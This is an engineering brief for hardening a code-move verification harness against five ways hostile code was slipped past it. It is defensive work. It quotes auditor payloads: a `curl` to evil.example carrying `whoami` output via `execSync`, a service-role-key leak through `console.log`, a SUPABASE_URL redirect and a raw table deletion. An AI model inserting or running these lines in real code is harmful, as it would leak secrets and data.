# Nadine (03, engineer) — BAD-078

## Brief
Close the five false-CLEAN holes BADS-078/Lamoka constructed in `scripts/movecheck/`, on the existing branch `feat/bad-078-movecheck` (PR https://github.com/0snug0/BadTakes/pull/381, commit `f3ead9a`). The harness is already built and landed on that branch; you are fixing it, not rewriting it.

## What happened, and why the fix has a particular shape

BADS-078/Carola built the harness. BADS-078/Russet audited it and found a silent hole: the header rule read a line's prefix and never asked what followed, so added code was stamped `traced` and the report came out byte-identical to the clean baseline at exit 0. Carola fixed that.

BADS-078/Lamoka then audited the fix and found **the same defect shape still live in the two largest forgiving categories** — because the fixes were scoped to the two attacks that found them rather than to the rules behind them. She constructed a false CLEAN five ways; **two produce a report byte-identical to the verified baseline** (md5 `760f0842cdd332cfeb06a9235878c211`, `cmp` identical, exit 0).

Read `spud --as <id> member show BADS-078/Lamoka` in full before you touch anything. Its Result has every attack with the exact payload, the invocation and the exit code. Then `member show BADS-078/Russet` for the round before it. **The lesson both rounds teach is the one that governs your work: fix the rule, not the attack.** A patch that makes Lamoka's five payloads fail while leaving the rule's shape intact is the third instance of this same bug and will be found by the next reviewer.

## The fixes

**L1 — `lines.mjs:123-125`, the ESM branch exempts the line, not the statement. Silent, byte-identical. Mandatory.**
`SPECIFIER` (:75) and `BARE_IMPORT` (:76) are unanchored substring tests, while `REQUIRE_BINDING` (:83) ends `;?$`. F3 anchored the require branch and left the ESM branch four lines above it open, so anything written after the specifier is exempt **on both sides**. Rewriting the existing `index.ts:2` to `import { fail, preflight } from '../_shared/respond.mjs'; Deno.env.set('SUPABASE_URL', 'https://evil.example');` reads clean with a zero report delta. 12 old and 81 new lines are import-accounted on the clean BAD-047 run. `export * from './x'; evil();` and `export { a } from './x'; evil();` exempt the same way.

Lamoka verified this fix in scratch: end-anchor both tests, mirroring `REQUIRE_BINDING`'s own trailing `;?$` — `/\bfrom\s*(['"`])[^'"`]+\1\s*;?$/` and `/^import\s*(['"`])[^'"`]+\1\s*;?$/`. **One caveat she named and left to you: the anchored form rejects an import-attribute clause (`assert { type: 'json' }`, `with { type: 'json' }`).** Nothing in the corpus has one, but this repo's server is Deno and that syntax is ordinary there. Decide whether to admit an optional attribute clause or to reject it, and say which in your Result — a rule that will fire a false alarm the first time someone imports JSON is a rule that gets switched off.

**L2 — `lines.mjs:40-41`, `isComment` is a prefix test. Silent, byte-identical. Mandatory.**
`startsWith('//') || startsWith('/*') || startsWith('*')`, and it never asks what follows once the comment closes; `bannerLength` (:48-56) and `account.mjs:160` then exempt the whole leading block. Rewriting one existing new-prose banner line, `room.ts:7`, to `/* updated row. */ console.log('leak', Deno.env.get('SUPABASE_SERVICE_ROLE_KEY'));` reads clean with an empty diff. 62 new lines are banner-accounted on BAD-047. The fix: reject a `/*`- or `*`-starting line carrying non-comment text after the closing `*/`. Note the bound Lamoka found, which is to the tool's credit and worth preserving: a banner line that *has* an old-side counterpart is already caught — this hole needs **new** prose, which is exactly what a split's new modules are full of.

**L4 — `lines.mjs:83`, `REQUIRE_BINDING`'s namelist admits an initializer. Mandatory.**
The `{[^{}]*}` alternative accepts a default expression: `const { PORT = require('child_process').execSync('curl -s https://evil.example/$(whoami)'), unused } = require('./gate.js');` at `scripts/web-api/config.js:12` reads clean at 1005/1005. Lamoka's fix restricts the namelist to identifiers, commas and renames (`\{[\w$\s,:]*\}`). This is the same rule Russet already made Carola tighten — tightened for the object-literal shape and not for this one, which is precisely the fix-the-attack pattern you are not to repeat.

**L5 — `movecheck.mjs:200-209`, `--json` carries neither signal. Mandatory.**
It emits `clean problems old new unaccounted added stale` and omits both `headers` and `isolated`. That matters exactly here: `HEADERS` is the only trace L3 leaves and `ISOLATED` is the only trace F2 leaves, so the machine form is strictly blinder than the human one and `--help` does not say so. Add both.

**L3 — `movecheck.mjs:80-82`, the `--help` claim is false. Fix the sentence; do NOT tighten `DELEGATION`.**
`--help` says the tail "must be ONE statement carrying no block of its own, so a body cannot be smuggled in after the condition". `DELEGATION = /^[^{};]*;?$/` blocks braces and a second `;` but admits the comma operator, a ternary, a concise arrow body, an added `await`, and a tagged template — Lamoka got a raw `delete from private.collab_members` through it. A comma sequence is a body, so the sentence is wrong.

**Spud's call, so you need not re-derive it: correct the disclosure and leave the rule permissive.** Every one of those payloads changes the printed `HEADERS` row, so the report diff is one line and a reader sees the smuggled text — that is the F1 fix earning its place, and it is the difference between this and a silent hole. Tightening `DELEGATION` to exclude commas would reject ordinary multi-argument calls and make a tool that cries wolf, which is the worse failure. Say plainly in `--help` what the tail rule does and does not exclude, and that `HEADERS` is where a reader adjudicates it.

Also in `--help`: `--no-regions` costs the destination map **and** the region shape, which is F2's only evidence. The suite's own CLI test passes that flag.

**Waiver fixtures — two corrections in `test/fixtures/movecheck/`.**
- `bad-047-collab.json`, the `loadRoom`-return group: its reason says a spread would give `info` the pre-wrap phase. **False.** `room.ts:72` `Object.assign(collab, done)` runs sixteen lines before the return at `:88`, so a spread written there copies the already-wrapped row and `info` reads the same phase either way. The property the waiver defends — hand the row back by identity — is real; the mechanism is wrong, which is the worst combination, because it teaches a reader to guard the harmless edit and not the dangerous one (a copy taken *before* the wrap block, or a refactor that makes the wrap write to something other than what is returned). Rewrite the reason to say that. The same sentence in `collab/room.ts:19-21` and in `c6b41a9`'s commit message is **BAD-088, not yours** — leave both alone.
- `bad-049-web-api.json`: one group claims its rewordings are waived on the new side when two of six are banner-accounted instead. Correct the claim to match what the tool actually does with them.
- While you are in there: the `email: any` prose is correct at `c6b41a9` but stale against `main` since #377. Not a fix — a hazard for whoever re-pins the corpus. If a comment in the fixture can say so cheaply, say it; otherwise put it in your Result.

## Tests — pin the rules, not the payloads

Lamoka's read of the six existing regression tests: "Mixed, and the gap is exactly where L1 lives." The F1 test tries three hostile tails but every one is blocked by a brace or a second semicolon, so it pins the rule **as written** rather than the claim `--help` makes, with no comma, ternary or template case. The F3 tests pin the require branch twice over and **never touch the ESM branch** — the other half of the same function, and the one still unsound.

So: a case per rule you change, written so it would fail against a patch that only special-cases Lamoka's string. Include the ESM branch in both its `import` and `export … from` forms, the banner-with-trailing-code shape, the namelist initializer, and — for the tail rule you are deliberately leaving permissive — a test pinning that the comma/ternary/template cases **do** appear in `HEADERS`, since that is now the documented reason they are allowed to pass.
